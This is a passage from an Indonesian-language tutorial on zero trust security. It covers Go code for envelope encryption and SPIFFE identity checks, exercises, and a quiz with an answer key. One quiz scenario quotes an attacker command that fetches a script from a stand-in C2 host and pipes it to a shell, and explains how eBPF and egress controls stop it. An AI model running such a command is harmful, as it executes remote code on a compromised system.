	engine := crypto.NewEnvelopeEngine(kms, "alias/core-banking-kek")

	secretPayload := []byte("ACCOUNT_BALANCE_SECRET_DATA_USD_5000000")
	fmt.Printf("Plaintext Asli: %s\n", string(secretPayload))

	payload, err := engine.Encrypt(secretPayload)
	if err != nil {
		log.Fatalf("Enkripsi Gagal: %v", err)
	}
	fmt.Printf("Ciphertext (Hex): %x...\n", payload.Ciphertext[:16])
	fmt.Printf("Encrypted DEK (Hex): %x...\n", payload.EncryptedDEK[:16])

	decrypted, err := engine.Decrypt(payload)
	if err != nil {
		log.Fatalf("Dekripsi Gagal: %v", err)
	}
	fmt.Printf("Hasil Dekripsi: %s\n", string(decrypted))

	if !bytes.Equal(secretPayload, decrypted) {
		log.Fatal("Data integrity check mismatch!")
	}
	fmt.Println("[PASSED] Integritas Enkripsi Amplop Sempurna.")

	fmt.Println("\n=== 2. UJI COBA VALIDASI SPIFFE SVID IDENTITY ===")
	spiffeURI, _ := url.Parse("spiffe://bank.corp/ns/production/sa/payment-worker")
	
	// Generate Dummy Ephemeral Certificate dengan SPIFFE URI
	privKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	template := x509.Certificate{
		SerialNumber: big.NewInt(1337),
		Subject:      pkix.Name{CommonName: "Payment Worker SVID"},
		NotBefore:    time.Now().Add(-1 * time.Hour),
		NotAfter:     time.Now().Add(1 * time.Hour),
		URIs:         []*url.URL{spiffeURI},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privKey.PublicKey, privKey)
	if err != nil {
		log.Fatalf("Gagal membuat sertifikat: %v", err)
	}
	cert, _ := x509.ParseCertificate(certDER)

	v := verifier.NewSpiffeVerifier("bank.corp")
	extractedID, err := v.ExtractAndVerify(cert)
	if err != nil {
		log.Fatalf("Validasi SPIFFE Gagal: %v", err)
	}
	fmt.Printf("[PASSED] SPIFFE Identity Berhasil Divalidasi: %s\n", extractedID)
}
```

#### Langkah 5: Run Code
Jalankan program dari shell:
```bash
go run main.go
```

---

### 13. Exercises

#### Level Easy
Buat fungsi unit testing menggunakan package `testing` di Go yang memverifikasi bahwa `EnvelopeEngine.Decrypt()` mengembalikan error `ErrDecryptionFailed` jika tepat 1 byte dari ciphertext diubah secara sengaja (pengujian tampering ciphertext).

#### Level Medium
Perluas file Rego pada **Seksi 7 (File: `policy/pdp.go`)** untuk menyertakan aturan *Rate Limiting Attribute*. Transaksi hanya boleh diizinkan (`allow = true`) jika:
1. `spiffe_id` valid.
2. `input.request_rate_per_minute <= 120`.
3. Akses dilakukan di luar jam kerja (misal: `input.is_weekend == true`), transaksi diizinkan HANYA jika `input.emergency_break_glass == true`. Tuliskan unit test Go untuk mensimulasikan kegagalan evaluasi jika nilai *emergency* bernilai `false`.

#### Level Hard
Rancang modul Go yang mengabstraksi pembaruan sertifikat SVID secara asinkron. Komponen harus:
1. Menjalankan *background goroutine* yang mensimulasikan rotasi sertifikat setiap 500 milidetik.
2. Menyimpan referensi sertifikat terkini di dalam pointer yang thread-safe menggunakan `sync/atomic` (bebas dari race condition dan mutex lock contention).
3. Melakukan 10.000 pembacaan sertifikat konkuren secara simultan menggunakan Go worker pool tanpa memicu data race (`go test -race`).

---

### 14. Challenge (Arsitektur Kompleks Tanpa Solusi Instan)

#### Skenario Masalah
Perusahaan Anda memiliki arsitektur *Active-Active Multi-Region Mesh* yang membentang antara Region `ap-southeast-1` (Singapura) dan `ap-southeast-3` (Jakarta). Jaringan inter-region dihubungkan oleh AWS Transit Gateway yang sewaktu-waktu dapat mengalami *split-brain network partitioning* (jaringan antar-region terputus total selama 45 menit, tetapi kedua region tetap melayani traffic lokal).

#### Parameter Masalah & Kendala:
1. **SPIRE Multi-Trust Domain:** Region Singapura menggunakan trust domain `spiffe://sg.corp`, sedangkan Jakarta menggunakan `spiffe://jkt.corp`. Kedua domain memiliki Root CA berbeda yang saling *federated*.
2. **Kondisi Failover:** Saat network partition terjadi, servis di Singapura harus tetap dapat memvalidasi token atau identitas yang dibawa oleh request yang dialihkan secara tiba-tiba ke Jakarta melalui DNS routing darurat, TANPA menghubungi SPIRE Server atau OPA PDP yang berada di region seberang.
3. **Penyimpanan Terdistribusi Kunci (KMS):** Data terenkripsi dengan KEK Singapura tidak dapat didekripsi langsung di Jakarta karena batasan data residency regulasi perbankan sentral.

#### Tugas Rekayasa:
Rancang arsitektur detail dan tuliskan dokumen spesifikasi teknis (*High-Level Design Document*) yang menjelaskan:
- Desain topologi SPIFFE Federation Bundle Endpoint agar SVID dari Singapura tetap dapat divalidasi integritasnya di Jakarta saat link antar-region mati total.
- Mekanisme *Cross-Region Envelope Encryption* yang compliant terhadap aturan *Data Sovereignty*, di mana payload dienkripsi secara ganda (*Dual Envelope Architecture*) sehingga pemrosesan lokal tetap terlindungi tanpa melanggar batasan hukum kedaulatan data.
- Bagaimana mitigasi *Replay Attack* dilakukan pada level Envoy Proxy terhadap token JWT-SVID yang diekspor keluar region selama masa insiden pemulihan jaringan berlangsung.

---

### 15. Quiz Evaluasi Pemahaman

#### Bagian 1: Basic (Pilihan Ganda)
1. Apa alasan utama alamat IP tidak lagi dianggap sebagai batas identitas yang valid dalam Zero Trust Architecture?
   - A. Alamat IP membutuhkan memori RAM terlalu besar untuk diproses.
   - B. Alamat IP bersifat dinamis, mudah dispoof, dan berada di luar kontrol workload dalam lingkungan kontainer/cloud efemer.
   - C. TLS 1.3 tidak mendukung enkripsi pada jaringan yang menggunakan alamat IPv4.
   - D. Subnetting CIDR membatasi enkripsi kriptografi AES.

2. Protokol apa yang dimanfaatkan oleh SPIFFE Workload API untuk mengautentikasi proses lokal di dalam host Linux tanpa token statis?
   - A. SSH Tunneling
   - B. BGP Peering
   - C. Unix Domain Sockets dengan pengecekan `SO_PEERCRED`
   - D. NTP Synchronization

3. Di mana letak perbedaan utama antara KEK (*Key Encryption Key*) dan DEK (*Data Encryption Key*)?
   - A. KEK digunakan untuk data payload; DEK digunakan untuk enkripsi hard disk fisik.
   - B. KEK tidak pernah keluar dari HSM/KMS; DEK digunakan langsung untuk mengenkripsi plaintext payload.
   - C. DEK memiliki panjang kunci 4096-bit; KEK selalu 128-bit.
   - D. KEK selalu dibuat ulang pada setiap transaksi; DEK bernilai statis selamanya.

4. Dalam model Policy Decision Point (PDP) dan Policy Enforcement Point (PEP), komponen manakah yang mengeksekusi aksi penolakan (Drop/RST packet)?
   - A. PDP
   - B. PEP
   - C. Certificate Authority
   - D. Database Storage

5. Modus operandi enkripsi AES mana yang menjamin tidak hanya kerahasiaan (*confidentiality*) tetapi juga keaslian data (*integrity/authentication*)?
   - A. AES-CBC
   - B. AES-ECB
   - C. AES-GCM
   - D. AES-CTR standar

#### Bagian 2: Intermediate (Pilihan Ganda & Analisis Arsitektur)
6. Mengapa penggunaan fungsi `http.send` di dalam rule Open Policy Agent (OPA) sangat tidak disarankan untuk traffic data-plane microservice berkecepatan tinggi?
   - A. Rego tidak memiliki parser JSON untuk merespons output.
   - B. Setiap network I/O memblokir alur evaluasi policy, meningkatkan tail-latency ($p99$) secara drastis.
   - C. `http.send` menghapus seluruh state memori yang dimiliki oleh OPA daemon.
   - D. Envoy proxy tidak mengizinkan response status selain HTTP 200 dari PDP.

7. Jika masa berlaku (TTL) X509-SVID disetel ke 30 menit, kapan waktu optimal bagi client workload untuk memperbarui sertifikat tersebut guna menghindari *service disruption*?
   - A. Tepat pada menit ke-29 detik ke-59.
   - B. Pada interval 50% dari TTL (yaitu menit ke-15).
   - C. Setelah sertifikat kedaluwarsa dan Envoy memunculkan pesan error pertama.
   - D. Sertifikat tidak perlu diperbarui jika TCP connection pooling diaktifkan.

8. Apa fungsi utama dari inisialisasi *Initialization Vector* (IV) / Nonce yang unik pada setiap operasi enkripsi AES-256-GCM?
   - A. Menjamin ciphertext yang dihasilkan selalu berbeda meskipun plaintext yang dienkripsi sama persis.
   - B. Mempercepat proses komputasi CPU sebesar 50%.
   - C. Menghilangkan kebutuhan akan Private Key KMS.
   - D. Mengubah enkripsi simetris menjadi asimetris secara otomatis.

9. Pada arsitektur runtime security berbasis eBPF, di layer manakah probe kernel bekerja untuk mendeteksi penyerang yang mengeksekusi shell binary?
   - A. Application Presentation Layer (L6)
   - B. User-space Library C (glibc wrapper)
   - C. Kernel Syscall Boundary (`sys_enter_execve`)
   - D. Hypervisor VM Virtual Disk

10. Mengapa teknik *memory zeroing* (menimpa array byte dengan `0x00`) wajib dilakukan terhadap DEK segera setelah proses enkripsi selesai di Go?
    - A. Untuk membantu Go runtime Garbage Collector berjalan lebih cepat.
    - B. Mencegah plain key bocor melalui analisis memori runtime, snapshot swap disk, atau coredump file saat insiden keamanan.
    - C. Memenuhi standar ukuran byte serialization JSON.
    - D. Menjamin alokasi memory heap tidak mengalami fragmentation.

#### Bagian 3: Skenario Kasus Produksi
11. **Skenario Kasus A:**
    Aplikasi microservice transfer perbankan Anda menggunakan mTLS dengan validasi X509-SVID. Tiba-tiba, 20% panggilan API antar-pod gagal serentak dengan error `TLS Handshake: Bad Certificate`. Setelah diinspeksi, SPIRE Agent di Node 3 dan Node 5 mengalami OOMKilled (Out of Memory). Mengapa kegagalan SPIRE Agent menyebabkan handshake mTLS pod yang masih hidup di node tersebut gagal setelah 1 jam?
    - Tuliskan analisis investigasi penyebab kegagalan rantai otentikasi tersebut!

12. **Skenario Kasus B:**
    Sebuah tim software engineering menyimpan DEK (Data Encryption Key) plaintext langsung di Redis Cache untuk menghemat biaya panggilan API AWS KMS. Redis diamankan dengan VPC private subnet dan password. Dari perspektif arsitektur keamanan Zero Trust, jelaskan 2 celah fatal dari implementasi ini!

13. **Skenario Kasus C:**
    Penyerang berhasil memperoleh akses RCE (Remote Code Execution) ke dalam kontainer Go web-server melalui celah dependency deserialization. Penyerang mencoba menjalankan command `curl https://malicious-c2.com/payload.sh | sh`. Jelaskan bagaimana integrasi eBPF (Tetragon) dan Service Mesh (Envoy mTLS egress) menggagalkan aksi penyerang tersebut secara berlapis (*Defense-in-Depth*)!

---

### Kunci Jawaban & Panduan Solusi Quiz

#### Bagian 1 & 2
1. **B** - Alamat IP bersifat efemer dan dapat dispoof; batas identitas modern bertumpu pada identitas kriptografis (SPIFFE ID).
2. **C** - Unix Domain Sockets menyediakan fungsi `SO_PEERCRED` yang diekstrak langsung oleh kernel OS untuk menjamin metadata proses penanya.
3. **B** - KEK berada di dalam HSM dan tidak pernah keluar; DEK digunakan untuk enkripsi data lokal masif.
4. **B** - Policy Enforcement Point (PEP) bertindak sebagai eksekutor kebijakan keamanan.
5. **C** - AES-GCM adalah standar AEAD yang menyediakan autentikasi integritas data sekaligus enkripsi kerahasiaan.
6. **B** - Panggilan jaringan eksternal dari dalam OPA memicu bottleneck latensi parah pada data plane.
7. **B** - Memperbarui pada masa 50% TTL memberikan ruang toleransi jaringan jika SPIRE Agent mengalami retry.
8. **A** - Nonce mencegah *replay attack* dan memastikan pola data sama tidak menghasilkan ciphertext identik (*pattern leakage*).
9. **C** - eBPF beroperasi secara deterministik pada tingkat kernel syscall interception boundary.
10. **B** - Memory sanitization mencegah kunci plaintext dibaca melalui teknik memory harvesting/dumping.

#### Bagian 3 (Panduan Evaluasi Kasus)
11. **Analisis Skenario Kasus A:**
    Envoy memegang sertifikat efemer SVID di dalam RAM yang masa berlakunya pendek (1 jam). Sertifikat tersebut disuplai dan diperbarui secara berkala oleh SPIRE Agent melalui Unix Domain Socket via Envoy SDS (Secret Discovery Service). Ketika SPIRE Agent mati karena OOM, pod aplikasi masih dapat berkomunikasi selama masa aktif sisa sertifikat lama masih berlaku. Namun, tepat setelah 1 jam (TTL habis), Envoy tidak dapat memperbarui sertifikat baru karena agent lokal mati. Akibatnya, sertifikat lokal kedaluwarsa dan handshake mTLS langsung ditolak oleh peer pod.
12. **Analisis Skenario Kasus B:**
    - Celah 1: Pelanggaran prinsip *Least Privilege* dan segregasi data. Siapa pun yang berhasil membobol Redis (atau servis lain yang berbagi instance Redis yang sama) langsung mendapatkan kunci pembuka seluruh database sensitif tanpa audit log dari KMS.
    - Celah 2: Ketiadaan audit trail non-repudiation. KMS mencatat *siapa*, *kapan*, dan *untuk payload apa* sebuah dekripsi diminta melalui CloudTrail. Redis tidak menyediakan context-aware cryptographic audit trail yang setara dengan HSM.
13. **Analisis Skenario Kasus C:**
    - Lapisan 1 (eBPF Tetragon): Begitu exploit memicu execution engine untuk menjalankan biner `/bin/sh` atau `/usr/bin/curl`, Tetragon pada kernel level mendeteksi syscall `sys_enter_execve` yang tidak masuk dalam manifest baseline kontainer. Tetragon langsung mengirimkan instruksi `SIGKILL` ke PID tersebut sebelum proses membuka soket jaringan.
    - Lapisan 2 (Envoy Service Mesh Egress): Jika binary berhasil berjalan, upaya `curl` ke IP eksternal (C2 Server) akan dihadang oleh Envoy Sidecar Egress. Dalam model Zero Trust, seluruh outgoing connection ke internet publik diblokir secara default (*Default Deny*) kecuali tujuan terdaftar eksplisit dalam ServiceEntry dengan otentikasi mTLS/TLS terverifikasi.

---

### 16. Summary

1. **Zero Trust Bukan Sekadar Produk, Melainkan Paradigma Arsitektur:** Asumsi mendasar ZTA adalah bahwa penyerang *sudah berada di dalam jaringan*. Oleh karena itu, perimeter subnet/IP tidak lagi memadai dan harus digantikan oleh **Workload Cryptographic Identity** (SPIFFE/SPIRE).
2. **Identitas Bebas Kredensial Statis:** Melalui SPIFFE Workload API dan pemanfaatan `SO_PEERCRED` pada Unix Domain Sockets di kernel Linux, beban kerja komputasi dapat memperoleh dokumen identitas efemer (X509-SVID) tanpa pernah menyimpan static password, API key, atau token jangka panjang pada konfigurasi file.
3. **Pemisahan Keputusan dan Penegakan Kebijakan (PDP vs PEP):** Arsitektur enterprise modern menggunakan proxy (Envoy) sebagai PEP dan engine deklaratif terisolasi (Open Policy Agent) sebagai PDP untuk menghasilkan keputusan otorisasi (ABAC) yang konsisten, auditabel, dan berkisar di bawah 1 milidetik.
4. **Proteksi Bertingkat Data-at-Rest:** Implementasi **Envelope Encryption** mengamankan data skala petabyte secara efisien: data dienkripsi secara lokal menggunakan DEK simetris (AES-256-GCM), sementara DEK dilindungi oleh KEK yang tersimpan permanen di dalam hardware HSM/KMS.
5. **Pertahanan Berlapis Mendalam (Defense-in-Depth):** Lapisan L4/L7 (mTLS + OPA) yang dipadukan dengan pemantauan kernel L0 (eBPF syscall detection) memastikan bahwa kegagalan proteksi pada satu layer aplikasi tidak berakibat pada kompromi sistem secara keseluruhan.